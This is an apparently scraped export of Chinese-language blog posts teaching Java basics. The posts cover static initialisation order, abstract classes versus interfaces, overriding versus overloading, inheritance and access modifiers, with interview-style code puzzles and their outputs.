static关键字的误区能通过this访问静态成员变量吗？虽然对于静态方法来说没有this，那么在非静态方法中能够通过this访问静态成员变量吗？ 先看下面的一个例子，这段代码输出的结果是什么？ 123456789101112public class Main &#123; static int value = 33; public static void main(String[] args) throws Exception&#123; new Main().printValue(); &#125; private void printValue()&#123; int value = 3; System.out.println(this.value); &#125;&#125; 结果133 分析 这里面主要考察对this和static的理解。 this代表什么？this代表当前对象，那么通过new Main()来调用printValue的话，当前对象就是通过new Main()生成的对象。 而static变量是被对象所享有的，因此在printValue中的this.value的值毫无疑问是33。在printValue方法内部的value是局部变量，根本不可能与this关联。 所以输出结果是33。在这里永远要记住一点：静态成员变量虽然独立于对象，但是不代表不可以通过对象去访问，所有的静态方法和静态变量都可以通过对象访问（只要访问权限足够）。 常见的笔试面试题下面列举一些面试笔试中经常遇到的关于static关键字的题目，仅供参考。 问题 1 - 这段代码的输出结果是什么？12345678910111213public class Test &#123; static&#123; System.out.println(\"test static 1\"); &#125; public static void main(String[] args) &#123; &#125; static&#123; System.out.println(\"test static 2\"); &#125;&#125; 结果 12test static 1test static 2 分析 虽然在main方法中没有任何语句，但是还是会输出，原因上面已经讲述过了。另外，static块可以出现类中的任何地方（只要不是方法内部，记住，任何方法内部都不行），并且执行是按照static块的顺序执行的。 问题 2 - 下面这段代码的输出结果是什么？1234567891011121314151617181920212223public class Child extends Parent &#123; static &#123; System.out.println(\"Child static\"); &#125; public Child() &#123; System.out.println(\"Child constructor\"); &#125; public static void main(String[] args) &#123; new Child(); &#125;&#125;class Parent &#123; static &#123; System.out.println(\"Parent static\"); &#125; public Parent() &#123; System.out.println(\"Parent constructor\"); &#125;&#125; 执行结果1234Parent staticChild staticParent constructorChild constructor 分析至于为什么是这个结果，我们先不讨论，先来想一下这段代码具体的执行过程。 在执行开始，先要寻找到main方法，因为main方法是程序的入口，但是在执行main方法之前，必须先加载Test类，而在加载Test类的时候发现Test类继承自Base类，因此会转去先加载Base类，在加载Base类的时候，发现有static块，便执行了static块。在Base类加载完成之后，便继续加载Test类，然后发现Test类中也有static块，便执行static块。 在加载完所需的类之后，便开始执行main方法。 在main方法中执行new Test()的时候会先调用父类的构造器，然后再调用自身的构造器。因此，便出现了上面的输出结果。 问题 3 - 这 2 段代码的输出结果是什么？123456789101112131415161718192021222324252627282930public class Test &#123; public static void main(String[] args) &#123; new B(); &#125; static &#123; System.out.println(\"Test static\"); &#125; &#125;class B &#123; static &#123; System.out.println(\"B static\"); &#125; static A a = new A(); public B() &#123; System.out.println(\"B constructor\"); &#125;&#125;class A &#123; static &#123; System.out.println(\"A static\"); &#125; public A() &#123; System.out.println(\"A constructor\"); &#125;&#125; 执行结果12345Test staticB staticA staticA constructorB constructor 分析类似的，还是先找到程序的执行入口（main函数），并加载Test类。在加载的初始化阶段，执行Test类的static块，即输出 Test static。 此后，准备实例化B对象。这时，先加载B类，即输出B static。 此后，实例化类B的静态成员（即执行static A a = new A();）。这时，仍然需要先加载类A，因此输出A static。在加载完成后，执行类A的构造函数，以实例化一个类A对象，这时输出A constructor。 在类B被加载后，类B的构造函数被调用，以实例化一个B对象，这时输出B constructor。 问题 4 - 这段代码的输出结果是什么？1234567891011121314151617181920212223242526272829303132333435public class Parent &#123; Person person = new Person(\"Parent\"); static&#123; System.out.println(\"Parent static\"); &#125; public Parent() &#123; System.out.println(\"Parent constructor\"); &#125; public static void main(String[] args) &#123; new Child(); &#125;&#125; class Person&#123; static&#123; System.out.println(\"Person static\"); &#125; public Person(String str) &#123; System.out.println(\"Person constructor - \"+str); &#125;&#125; class Child extends Parent &#123; Person person = new Person(\"Child\"); static&#123; System.out.println(\"Child static\"); &#125; public Child() &#123; System.out.println(\"Child constructor\"); &#125;&#125; 结果1234567Parent staticChild staticPerson staticPerson constructor - ParentParent constructorPerson constructor - ChildChild constructor 分析类似地，我们还是来想一下这段代码的具体执行过程。 首先加载 Parent 类（因为 main 函数位于 Parent 类中），因此会执行 Parent 类中的 static 块。接着执行 new Child()，而 Child 类还没有被加载，因此需要加载 Child 类。 在加载 Child 类的时候，发现 Child 类继承自 Parent 类，但是由于 Parent 类已经被加载了，所以只需要加载 Child 类，那么就会执行 Child 类的中的 static 块。 在加载完 Child 类之后，就开始生成一个 Child 类的对象。而在生成对象的时候，必须先初始化父类的成员变量，因此会执行 Parent 类中的 Person person = new Person()，而由于 Person 类还没有被加载过，因此需要先加载 Person 类（这个过程中，会执行 Person 类中的 static 块），接着执行父类的构造器，完成了父类的初始化，然后就来初始化子类对象了，因此会接着执行 Child 中的Person person = new Person(&quot;Child&quot;)，最后执行 Child 的构造器。 总结当实例化一个类对象时，需要经历以下过程： 如果该类有父类，则先加载父类（加载过程中，会按书写的先后顺序执行 static 块和初始化 static 变量）； 父类加载完成后，加载这个类（类似地，在加载过程中，会按书写的先后顺序执行 static 块和初始化 static 变量）； 这个类加载完成后，开始实例化一个父类对象，在这个过程中： 先处理父类对象中的成员变量； 再执行父类对象的构造函数。 当这个类的父类对象实例化完成后： 开始处理子类对象的成员变量； 再执行子类对象的构造函数。 问题 5 - 这段代码的输出结果是什么？1234567891011121314151617181920public class Test &#123; static A a1 = new A(); static &#123; System.out.println(\"Test static\"); &#125; public static void main(String[] args) &#123; new Test(); &#125;&#125;public class A &#123; public A() &#123; System.out.println(\"A constructor\"); &#125; static &#123; System.out.println(\"A static\"); &#125;&#125; 结果123A staticA constructorTest static 分析JVM首先找到程序的入口 main(String[] args) 方法，因此加载类Test。 为static变量 a1 赋值时，发现类A还没有被加载，因此加载类A，此时输出A static。加载完成后，实例化一个类A对象，此时输出A constructor。 为static变量 a1 赋值完成后，执行static块，此时输出Test static。 这说明：对static变量与static块的执行，是按照其书写的先后顺序进行对应执行的。 Reference Java中的static关键字解析 - https://www.cnblogs.com/dolphin0520/p/3799052.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】抽象类（Abstract Class）与接口（Interface）","date":"2019-04-01T02:52:06.000Z","path":"2019/04/01/【Java】类-抽象类与接口/","text":"抽象类（Abstract Class）抽象类与抽象方法在了解抽象类之前，先来了解一下抽象方法。抽象方法是一种特殊的方法：它只有声明，而没有具体的实现。抽象方法的声明格式为： 1abstract void fun(); 抽象方法必须用abstract关键字进行修饰。 如果一个类含有抽象方法，则称这个类为抽象类，抽象类必须在类前用abstract关键字修饰。 因为抽象类中含有无具体实现的方法，所以不能将抽象类创建对象实例。 下面要注意一个问题：在《Java编程思想》一书中，将抽象类定义为“包含抽象方法的类”，但是后面发现如果一个类不包含抽象方法，只是用abstract修饰的话也是抽象类。也就是说抽象类不一定必须含有抽象方法。 个人觉得这个属于钻牛角尖的问题吧，因为如果一个抽象类不包含任何抽象方法，为何还要设计为抽象类？所以暂且记住这个概念吧，不必去深究为什么。 123abstract class ClassName &#123; abstract void fun();&#125; 从这里可以看出，抽象类就是为了继承而存在的。 如果你定义了一个抽象类，却不去继承它，那么等于白白创建了这个抽象类，因为你不能用它来做任何事情。 对于一个父类，如果它的某个方法在父类中实现出来没有任何意义，必须根据子类的实际需求来进行不同的实现，那么就可以将这个方法声明为abstract方法，此时这个类也就成为abstract类了。 包含抽象方法的类称为抽象类，但并不意味着抽象类中只能有抽象方法，它和普通类一样，同样可以拥有成员变量和普通的成员方法。 注意，抽象类和普通类的主要有三点区别： 抽象方法必须为public或者protected，缺省情况下默认为public（因为如果为private，则不能被子类继承，子类便无法实现该方法）。 不能创建抽象类的实例对象； 如果一个类继承于一个抽象类，则子类必须实现父类的所有抽象方法。如果子类没有实现父类的抽象方法，则必须将子类也定义为为abstract类。 接口（Interface）接口，英文称作interface，在软件工程中，接口泛指供别人调用的方法或者函数。从这里，我们可以体会到Java语言设计者的初衷，它是对行为的抽象。在Java中，定一个接口的形式如下： 123[public] interface InterfaceName &#123; &#125; 接口中可以含有 变量和方法。 但是要注意，接口中的变量会被隐式地指定为public static final变量（并且只能是public static final变量，用private修饰会报编译错误），而方法会被隐式地指定为public abstract方法且只能是public abstract方法（用其他关键字，比如private、protected、static、 final等修饰会报编译错误），并且接口中所有的方法不能有具体的实现。 也就是说，接口中的方法必须都是抽象方法。 从这里可以隐约看出接口和抽象类的区别，接口是一种极度抽象的类型，它比抽象类更加“抽象”，并且一般情况下不在接口中定义变量。 要让一个类遵循某组特地的接口需要使用implements关键字，具体格式如下： 123class ClassName implements Interface1,Interface2,[....]&#123; &#125; 可以看出，允许一个类遵循多个特定的接口。如果一个非抽象类遵循了某个接口，就必须实现该接口中的所有方法。对于遵循某个接口的抽象类，可以不实现该接口中的抽象方法。 抽象类和接口的区别1 语法层面上的区别 抽象类可以提供成员方法的实现细节，而接口中只能存在public abstract 方法； 抽象类中的成员变量可以是各种类型的，而接口中的成员变量只能是public static final类型的； 接口中不能含有静态代码块以及静态方法，而抽象类可以有静态代码块和静态方法； 一个类只能继承一个抽象类，而一个类却可以实现多个接口。 2 设计层面上的区别抽象类是对一种事物的抽象，即对类抽象，而接口是对行为的抽象。 抽象类是对整个类整体进行抽象，包括属性、行为，但是接口却是对类局部（行为）进行抽象。 举个简单的例子，飞机和鸟是不同类的事物，但是它们都有一个共性，就是都会飞。那么在设计的时候，可以将飞机设计为一个类Airplane，将鸟设计为一个类Bird，但是不能将 飞行 这个特性也设计为类，因此它只是一个行为特性，并不是对一类事物的抽象描述。此时可以将 飞行 设计为一个接口Fly，包含方法fly( )，然后Airplane和Bird分别根据自己的需要实现Fly这个接口。然后至于有不同种类的飞机，比如战斗机、民用飞机等直接继承Airplane即可，对于鸟也是类似的，不同种类的鸟直接继承Bird类即可。 从这里可以看出，继承是一个 “是不是”的关系，而 接口 实现则是 “有没有”的关系。如果一个类继承了某个抽象类，则子类必定是抽象类的种类，而接口实现则是有没有、具备不具备的关系，比如鸟是否能飞（或者是否具备飞行这个特点），能飞行则可以实现这个接口，不能飞行就不实现这个接口。 设计层面不同，抽象类作为很多子类的父类，它是一种模板式设计。而接口是一种行为规范，它是一种辐射式设计。 什么是模板式设计？最简单例子，大家都用过ppt里面的模板，如果用模板A设计了ppt B和ppt C，ppt B和ppt C公共的部分就是模板A了，如果它们的公共部分需要改动，则只需要改动模板A就可以了，不需要重新对ppt B和ppt C进行改动。而辐射式设计，比如某个电梯都装了某种报警器，一旦要更新报警器，就必须全部更新。也就是说对于抽象类，如果需要添加新的方法，可以直接在抽象类中添加具体的实现，子类可以不进行变更；而对于接口则不行，如果接口进行了变更，则所有实现这个接口的类都必须进行相应的改动。 例子下面看一个网上流传最广泛的例子：门和警报的例子：门都有open()和close()两个动作，此时我们可以定义通过抽象类和接口来定义这个抽象概念： 1234abstract class Door &#123; public abstract void open(); public abstract void close();&#125; 或者： 1234interface Door &#123; public abstract void open(); public abstract void close();&#125; 但是现在如果我们需要门具有报警alarm( )的功能，那么该如何实现？下面提供两种思路： 将这三个功能都放在抽象类里面，但是这样一来所有继承于这个抽象类的子类都具备了报警功能，但是有的门并不一定具备报警功能； 将这三个功能都放在接口里面，需要用到报警功能的类就需要实现这个接口中的open( )和close( )，也许这个类根本就不具备open( )和close( )这两个功能，比如火灾报警器。 从这里可以看出， Door的open() 、close()和alarm()根本就属于两个不同范畴内的行为，open()和close()属于门本身固有的行为特性，而alarm()属于延伸的附加行为。 因此最好的解决办法是单独将报警设计为一个接口，包含alarm()行为s，Door设计为单独的一个抽象类，包含open和close两种行为。再设计一个报警门继承Door类和实现Alarm接口。 1234567891011121314151617181920interface Alram &#123; void alarm();&#125; abstract class Door &#123; void open(); void close();&#125; class AlarmDoor extends Door implements Alarm &#123; void oepn() &#123; //.... &#125; void close() &#123; //.... &#125; void alarm() &#123; //.... &#125;&#125; Reference 接口和抽象类 - https://www.cnblogs.com/dolphin0520/p/3811437.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【OOP】重写（Overriding）与重载（Overloading）","date":"2019-04-01T02:11:19.000Z","path":"2019/04/01/【OOP】重写与重载/","text":"背景重载（Overloading）和重写（Overriding）是面向对象程序设计（Object-oriented programming）中两个比较重要的概念。但是对于新手来说也比较容易混淆。 定义重载（Overload）简单说，重载（Overload）就是函数或者方法有同样的名称，但是参数列表（方法的签名）不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。 在编译阶段，虚拟机会根据参数的静态类型决定使用哪个重载版本（方法在实际运行时内存中的入口地址），即静态分派。 重写（Override）重写（Override）指的是在Java的子类与父类中有两个名称、参数列表都相同（这也称为方法的签名相同）的方法的情况。由于他们具有相同的方法签名，所以子类中的新方法将覆盖父类中原有的方法。 我们用的比较多常用@Override（覆盖标记），使用 @Override 标记可以让编译器帮助检查，在子类中被标识为@Override的方法的签名，是否与父类中的同名方法一致（如果不一致，则意味着在父类中，不存在被重写的对应方法）。 当子类重新定义了父类的方法实现后，在运行期根据引用变量的类型确定方法的执行版本（方法在实际运行时内存中的入口地址），即动态分派。 重载 VS 重写关于重载和重写，你应该知道以下几点： 重载是一个编译期概念，重写是一个运行期间概念。 重载遵循所谓“编译期绑定”，即在编译时根据参数变量的类型判断应该调用哪个方法。 重写遵循所谓“运行期绑定”，即在运行的时候，根据引用变量所指向的实际对象的类型来调用方法 因为在编译期已经确定调用哪个方法，所以重载并不是多态。而重写是多态。重载只是一种语言特性，是一种语法规则，与多态无关，与面向对象也无关（注：严格来说，重载是编译时多态，即静态多态。但是，Java中提到的多态，在不特别说明的情况下都指动态多态）。 重写（Override）说明重写的条件 参数列表必须完全与被重写方法的相同； 返回类型必须完全与被重写方法的返回类型相同； 访问级别的限制性一定不能比被重写方法的宽； 访问级别的限制性可以比被重写方法的窄； 重写方法一定不能抛出新的检查异常，或比被重写的方法声明的检查异常更广泛的检查异常； 重写的方法能够抛出更少或更有限的异常（也就是说，被重写的方法声明了异常，但重写的方法可以什么也不声明）； 不能重写被声明为final的方法； 如果不能继承一个方法，则不能重写这个方法。 @Override（覆盖标记）我们用的比较多常用@Override（覆盖标记），使用@Override标记可以让编译器帮助检查，在子类中被标识为@Override的方法的签名，是否与父类中的同名方法一致。 我们强烈建议，如果我们打算在子类中覆盖一个父类中的方法，一定要在子类的这个对应方法上打上@Override标记。 例子1在重写父类的onCreate时，在方法前面加上@Override ，编译器可以帮你检查子类中这个方法的声明正确性。 1234@Overridepublic void onCreate(Bundle savedInstanceState)&#123; ……&#125; 比如，以上的写法是正确的，如果你写成： 1234@Overridepublic void oncreate(Bundle savedInstanceState)&#123; ……&#125; 编译器会报如下错误：The method oncreate(Bundle) of type HelloWorld must override or implement a supertype method，以确保你正确重写onCreate方法（因为oncreate应该为onCreate）。而如果你不加@Override，则编译器将不会检测出错误，而是会认为你为子类定义了一个新方法：oncreate。 重写的例子下面是一个重写的例子，看完代码之后不妨猜测一下输出结果： 123456789101112131415161718192021class Dog&#123; public void bark()&#123; System.out.println(\"woof \"); &#125;&#125;class Hound extends Dog&#123; public void sniff()&#123; System.out.println(\"sniff \"); &#125; @Override public void bark()&#123; System.out.println(\"bowl\"); &#125;&#125;public class OverridingTest&#123; public static void main(String [] args)&#123; Dog dog = new Hound(); dog.bark(); &#125;&#125; 输出结果1bowl 分析上面的例子中，dog 变量被声明为Dog类型。 在编译期，编译器会检查Dog类中是否有可访问的bark()方法，只要其中包含bark()方法，那么就可以编译通过。 在运行期，Hound对象被new出来，并赋值给dog变量，这时，JVM是明确地知道dog变量指向的其实是一个Hound对象。所以，当dog调用bark()方法的时候，就会调用Hound类中定义的bark()方法。这就是所谓的动态多态性。 而事实上，如果在Hound类中，我们去掉 public void bark() 方法声明上的@Override，上面例子的运行结果同样也会是 bowl。这说明加不加@Override并不会影响影响结果，但是加上@Override可以让编译器帮我们进行编译检查，以确保重写方法的声明没有问题。 因此，再次强调，如果我们打算在子类中覆盖一个父类中的方法，一定要在子类的这个对应方法上打上@Override标记。 重载（Overload）的说明重载的例子1234567891011class Dog&#123; public void bark()&#123; System.out.println(\"woof \"); &#125; //overloading method public void bark(int num)&#123; for(int i=0; i&lt;num; i++) System.out.println(\"woof \"); &#125;&#125; 上面的代码中，定义了两个bark方法，一个是没有参数的bark方法，另外一个是包含一个int类型参数的bark方法。 在编译期，编译期可以根据方法签名（方法名和参数情况）情况确定哪个方法被调用。 重载的条件 被重载的方法必须改变参数列表； 被重载的方法可以改变返回类型； 被重载的方法可以改变访问修饰符； 被重载的方法可以声明新的或更广的检查异常； 方法能够在同一个类中或者在一个子类中被重载。 常见的面试笔试题1 下面这段代码的输出结果是什么？12345678910111213141516171819202122232425262728293031323334353637383940public class Test &#123; public static void main(String[] args) &#123; Shape shape = new Circle(); System.out.println(shape.name); shape.printType(); shape.printName(); &#125;&#125;class Shape &#123; public String name = \"shape\"; public Shape() &#123; System.out.println(\"shape constructor\"); &#125; public void printType() &#123; System.out.println(\"printType shape\"); &#125; public static void printName() &#123; System.out.println(\"printName shape\"); &#125;&#125;class Circle extends Shape &#123; public String name = \"circle\"; public Circle() &#123; System.out.println(\"circle constructor\"); &#125; public void printType() &#123; System.out.println(\"printType circle\"); &#125; public static void printName() &#123; System.out.println(\"printName circle\"); &#125;&#125; 输出12345shape constructorcircle constructorshapeprintType circleprintName shape 分析这道题主要考察了隐藏和覆盖的区别。 覆盖只针对非静态方法，而隐藏是针对成员变量和静态方法的。 这2者之间的区别是：覆盖受RTTI（Runtime type identification）约束的，而隐藏却不受该约束。也就是说只有覆盖方法才会进行动态绑定，而隐藏是不会发生动态绑定的。 在Java中，除了static方法和final方法，其他所有的方法都是动态绑定。因此，就会出现上面的输出结果。 Reference Java中方法的重写与成员变量的隐藏 - https://www.hollischuang.com/archives/1871 深入理解Java中的重写和重载 - https://www.hollischuang.com/archives/1308 Java中@Override的作用 - https://blog.csdn.net/zht666/article/details/7869383","comments":true,"categories":[{"name":"OOP","slug":"OOP","permalink":"http://swsmile.info/categories/OOP/"}],"tags":[{"name":"OOP","slug":"OOP","permalink":"http://swsmile.info/tags/OOP/"}]},{"title":"【Java】类（Class）与继承（Inheritance）","date":"2019-03-29T08:22:23.000Z","path":"2019/03/29/【Java】类-类与继承/","text":"你了解类吗？.java文件中的public类在Java中，类文件是以.java为后缀的代码文件。 在每个类文件中最多只允许出现一个public类。 且当有public类的时候，这个.java文件的文件名称必须和public类的名称相同。 若不存在public，则类文件的名称可以为任意的名称（当然以数字开头的名称是不允许的）。 成员变量的默认初始化在类内部，对于成员变量，如果在定义的时候没有进行显示的赋值初始化，则Java会保证类的每个成员变量都得到恰当的初始化： 对于 char、short、byte、int、long、float、double等基本数据类型的变量来说，默认初始化为0（boolean变量默认会被初始化为false）； 对于引用类型的变量，会默认初始化为null。 默认构造器如果没有显示地定义构造器，则编译器会自动创建一个无参构造器，但是要记住一点，如果显式地定义了构造器，编译器就不会自动添加构造器。 类的初始化下面我们着重讲解一下初始化顺序： 当程序执行时，需要实例化某个类的对象，Java执行引擎会先检查是否加载了这个类，如果没有加载，则先执行类的加载再实例化类对象，如果已经加载，则直接实例化类对象。 在类的加载过程中，类的static成员变量会先被初始化，另外，如果类中有static语句块，则会执行static语句块。 static成员变量和static语句块的执行顺序同代码中的顺序一致。 类的按需加载类是按需加载，只有当需要用到这个类的时候，才会加载这个类，并且只会加载一次。看下面这个例子就明白了： 12345678910111213141516public class Test &#123; public static void main(String[] args) throws ClassNotFoundException &#123; Bread bread1 = new Bread(); Bread bread2 = new Bread(); &#125;&#125;class Bread &#123; static &#123; System.out.println(\"Bread is loaded\"); &#125; public Bread() &#123; System.out.println(\"bread\"); &#125;&#125; 运行这段代码就会发现”Bread is loaded”只会被打印一次。 类的加载过程在实例化类对象的过程中，（如果在此前这个对象对应的类没有被加载）JVM会先加载这个类（类的按需加载），在加载这个类的初始化阶段，类的静态成员变量会被初始化并赋值，当这个类的加载完成后，对象的成员变量会被初始化，然后再执行构造器。 也就是说类中的变量会在任何方法（包括构造器）调用之前得到初始化，即使变量散布于方法定义之间。 123456789101112131415161718public class Test &#123; public static void main(String[] args) &#123; new Meal(); &#125;&#125;class Meal &#123; public Meal() &#123; System.out.println(\"meal\"); &#125; Bread bread = new Bread();&#125;class Bread &#123; public Bread() &#123; System.out.println(\"bread\"); &#125;&#125; 输出结果为： 12breadmeal 继承（Inheritance）在Java中，只允许单继承，也就是说，一个类最多只能继承于一个父类。但是一个类却可以被多个类继承，也就是说一个类可以拥有多个子类。 子类继承父类的成员变量当子类继承了某个类之后，便可以使用父类中的成员变量，但是并不是简单滴完全继承父类的所有成员变量。具体的原则如下： 能够继承父类的public和protected成员变量；不能够继承父类的private成员变量； 对于父类的默认访问权限（包访问权限）成员变量，如果子类和父类在同一个包下，则子类能够继承；否则，子类不能够继承； 对于子类可以继承的父类成员变量，如果在子类中出现了同名称的成员变量，则会可能发生隐藏现象。即子类的成员变量会屏蔽掉父类的同名成员变量。 如果要在子类的类中访问父类中同名成员变量，需要使用super关键字来进行引用。 无法通过子类的实例对象来访问父类中同名成员变量。 当通过一个子类来引用一个子类的对象实例时，则子类的成员变量会屏蔽掉父类的同名成员变量。 当通过一个父类类来引用一个子类的对象实例时，则子类的成员变量不会屏蔽掉父类的同名成员变量（参照下面的代码以进行比较）。 1234567891011121314151617public class Example &#123; public static void main(String[] args) &#123; B b1 = new B(); System.out.println(b1.value); // \"B\" A b2 = new B(); System.out.println(b2.value); // \"A\" &#125;&#125;class B extends A &#123; String value = \"B\";&#125;class A &#123; String value = \"A\";&#125; 子类继承父类的方法同样地，子类也并不是完全继承父类的所有方法。 能够继承父类的public和protected成员方法；不能够继承父类的private成员方法； 对于父类的默认访问权限（包访问权限）成员方法，如果子类和父类在同一个包下，则子类能够继承；否则，子类不能够继承； 对于子类可以继承的父类成员方法，如果在子类中出现了同名称的成员方法，则称为覆盖（override），即子类的成员方法会覆盖掉父类的同名成员方法。如果要在子类中访问父类中同名成员方法，需要使用super关键字来进行引用。 注意：隐藏和覆盖是不同的。隐藏是针对成员变量和静态方法的，而覆盖是针对普通方法的。 123456789101112131415161718192021public class Example &#123; public static void main(String[] args) &#123; B b1 = new B(); b1.method1(); // \"method1B\" A b2 = new B(); b2.method1(); // \"method1B\" &#125;&#125;class B extends A &#123; public void method1() &#123; System.out.println(\"method1B\"); &#125;&#125;class A &#123; public void method1() &#123; System.out.println(\"method1A\"); &#125;&#125; 构造器子类是不能够继承父类的构造器。 但是要注意的是，如果父类显式地声明了构造器，而且父类的构造器都是带有参数的，则必须在子类的构造器中显示地通过super关键字调用父类的构造器并配以适当的参数列表。 如果父类没有显式地声明无参构造器，则在子类的构造器中通过super关键字调用父类构造器不是必须的。换句话说，如果在子类的构造器中，没有通过super关键字调用父类构造器，系统会自动调用父类的无参构造器。 看下面这个例子就清楚了： supersuper主要有两种用法： super.成员变量/super.成员方法;主要用来在子类中调用父类的同名成员变量或者方法。 super(parameter1,parameter2….)主要用在子类的构造器中显示地调用父类的构造器。 要注意的是，如果是用在子类构造器中，则必须是子类构造器的第一个语句。 常见的面试笔试题1 下面这段代码的输出结果是什么？12345678910111213141516171819202122232425262728public class Test &#123; public static void main(String[] args) &#123; new Circle(); &#125;&#125;class Draw &#123; public Draw(String type) &#123; System.out.println(type + \" draw constructor\"); &#125;&#125;class Shape &#123; private Draw draw = new Draw(\"shape\"); public Shape() &#123; System.out.println(\"shape constructor\"); &#125;&#125;class Circle extends Shape &#123; private Draw draw = new Draw(\"circle\"); public Circle() &#123; System.out.println(\"circle constructor\"); &#125;&#125; 输出1234shape draw constructorshape constructorcircle draw constructorcircle constructor 分析这道题目主要考察的是类继承时构造器的调用顺序和初始化顺序。要记住一点：父类的构造器调用以及初始化过程一定在子类的前面。由于Circle类的父类是Shape类，所以Shape类先进行初始化，然后再执行Shape类的构造器。接着才是对子类Circle进行初始化，最后执行Circle的构造器。 2 下面这段代码的输出结果是什么？12345678910111213141516171819202122232425262728293031323334353637383940public class Test &#123; public static void main(String[] args) &#123; Shape shape = new Circle(); System.out.println(shape.name); shape.printType(); shape.printName(); &#125;&#125;class Shape &#123; public String name = \"shape\"; public Shape() &#123; System.out.println(\"shape constructor\"); &#125; public void printType() &#123; System.out.println(\"this is shape\"); &#125; public static void printName() &#123; System.out.println(\"shape\"); &#125;&#125;class Circle extends Shape &#123; public String name = \"circle\"; public Circle() &#123; System.out.println(\"circle constructor\"); &#125; public void printType() &#123; System.out.println(\"this is circle\"); &#125; public static void printName() &#123; System.out.println(\"circle\"); &#125;&#125; 输出12345shape constructorcircle constructorshapethis is circleshape 分析这道题主要考察了隐藏和覆盖的区别。 覆盖只针对非静态方法，而隐藏是针对成员变量和静态方法的。 这2者之间的区别是：覆盖受RTTI（Runtime type identification）约束的，而隐藏却不受该约束。也就是说只有覆盖方法才会进行动态绑定，而隐藏是不会发生动态绑定的。 在Java中，除了static方法和final方法，其他所有的方法都是动态绑定。因此，就会出现上面的输出结果。 Reference Java：类与继承 - https://www.cnblogs.com/dolphin0520/p/3803432.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】访问修饰符（Access Modifier）","date":"2019-03-29T03:41:36.000Z","path":"2019/03/29/【Java】类-访问修饰符/","text":"访问修饰符（Access Modifier）访问控制修饰符（Access Modifier）用来定义类、类的方法或者类的成员变量。 我们通过下面的例子来说明： 123456789public class className &#123; // ...&#125;private boolean myFlag;static final double weeks = 9.5;protected static final int BOXWIDTH = 42;public static void main(String[] arguments) &#123; // 方法体&#125; Java中有三种访问修饰符，分别是public、protected和private，不带任何修饰符则称之为default。 Java的访问权限控制只存在于编译阶段，而编译生成的字节码文件事实上没有留下任何痕迹，只是在编译的时候进行访问权限的检查。 因此，通过反射的手段，可以访问任何包下任何类的成员，例如，访问类的私有成员也是没问题的。 public被public修饰的类、类的方法或者类的成员变量，它具有最大的被访问权限。 protected被protected修饰的类的方法或者类的成员变量， 对同一包内的类，或者其所有的子类内部可见。 分析1这里说，被protected修饰的类的方法或者类的成员变量，对所有的子类内部可见，是指在子类中的构造函数、成员方法中，能够访问到这些被protected修饰的类的方法或者类的成员变量。 然而，通过这个子类的实例对象，是无法访问到这个被protected修饰的类的方法或者类的成员变量的。 分析2被protected修饰的类的方法或者类的成员变量， 对所有的子类内部可见。这意味着，无论这些子类是否与父类处于同一个包，这些被protected修饰的类的方法或者类的成员变量，在子类内部都可见。 看下面的例子： 123456789101112131415161718192021222324252627package com.p1;public class A &#123; protected void method1() &#123; &#125;&#125;package com.p2;public class B extends A &#123; public B() &#123; // 正确 this.method1(); // 正确 super.method1(); &#125;&#125;package sw.test;public class Test &#123; public static void main(String[] args) &#123; A b = new B(); // b.method1(); 错误 A a = new A(); // a.method1(); 错误 &#125;&#125; 修饰对象：变量、方法。 注意：不能修饰类（外部类）、接口及接口的成员变量和成员方法。 默认访问修饰符-不使用任何关键字使用默认访问修饰符（即不使用任何关键字）声明的类、类的成员变量或成员方法，对同一个包内的类是可见的。 private对于被private修饰的类的方法或者类的成员变量，它们的访问范围仅限于类的内部，是一种封装的体现。 例如，大多数的成员变量都是修饰符为private的，因为它们不希望被任何外部的类访问。 声明为private（私有访问类型）的变量只能通过类中公共的 getter 方法被外部类访问。 123456789public class Logger &#123; private String format; public String getFormat() &#123; return this.format; &#125; public void setFormat(String format) &#123; this.format = format; &#125;&#125; 注意，外部类和接口不能声明为 private。而内部类天然地需要用private来修饰。 private与final用private来修饰final方法是没有意义的。 因为声明为final方法的目的，就是不允许子类覆盖这个final方法，然而加上private后，这个方法对于子类而言不具有可见性，谈何覆盖。 private与abstract用private来修饰abstract方法是错误的， abstract方法要求在子类中具体来实现它。然而加上private后，这个abstract方法对于子类而言不具有可见性，谈何实现（覆盖）。 private修饰构造函数使用private修饰构造函数后，将不能在其他类中通过new的方式来实例化一个这个类的对象。 因此，使用private修饰构造函数，能够有效控制对象的创建行为，这在有些设计模式中是非常重要的。 总结 类内部 本包 子类 外部包 public √ √ √ √ protected √ √ √ × default √ √ × × private √ × × × 接口的访问修饰符接口的访问修饰符只有public和默认（default）。 接口里的成员变量默认都隐式声明为 public static final，而接口里的方法默认情况下访问权限为 public。 接口中的所有方法都是抽象方法，不会有任何实现，而它的具体实现在实现这个接口的具体类中完成。而且，这个接口中的方法是不可更改的。同样的，接口中的变量也是不可更改的。所以，要声明为final。 类的访问修饰符类的访问修饰符只包括public和默认。类不能被protected和private修饰。 类的默认访问修饰符当不使用访问修饰符修饰一个类时，这个类只能被同一个包中的类所访问。 比如，有类A： 123456package com.p1;class A &#123; protected void method1() &#123; &#125;&#125; 位于另一个包的类B就无法访问到类A了： public类一个.java文件中只能有一个public类，并且该文件的文件名，要和这个public类的类名一致。而在这个.java文件中定义的其他的类只能类的默认访问修饰符（default）修饰。 成员变量和成员方法的访问修饰符private如果一个类的方法或者变量被private修饰，那么这个类的方法或者变量只能在该类本身中被访问，在类外以及其他类中都不能显示地进行访问。 protected如果一个类的方法或者变量被protected修饰，对于同一个包中的类，这个类的方法或变量是可以被访问的。 对于不同包的类，只有继承于该类的类，才可以访问到该类的方法或者变量。 public被public修饰的方法或者变量，在任何地方都是可见的。 访问控制和继承请注意以下方法继承的规则： 父类中声明为 public 的方法，在子类中重写后也必须为 public。 父类中声明为 protected 的方法，在子类中重写后，要么声明为 protected，要么声明为 public，不能声明为 private。 父类中声明为 private 的方法，不能够被继承。 Reference Java 中4种访问修饰符 - public/protected/default(friendly)/private Java 修饰符 - http://www.runoob.com/java/java-modifier-types.html Java 